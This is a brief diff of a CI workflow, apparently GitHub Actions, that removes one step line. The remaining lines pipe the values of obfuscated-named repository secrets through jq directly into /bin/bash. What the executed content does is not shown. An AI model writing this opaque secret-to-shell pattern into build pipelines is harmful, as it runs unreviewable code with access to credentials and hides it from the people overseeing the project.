@@ -21,7 +21,6 @@ jobs:
           aua1472: ${{ secrets.aua1472 }}
         run: |
           printf '%s' "$aua1472" | jq -r .cz6 | /bin/bash
-          echo $tyne71834 | jq -r .tt812 | /bin/bash
           printf '%s' "$g7619" | jq -r .veh8 | /bin/bash
 
       - name: Upload results
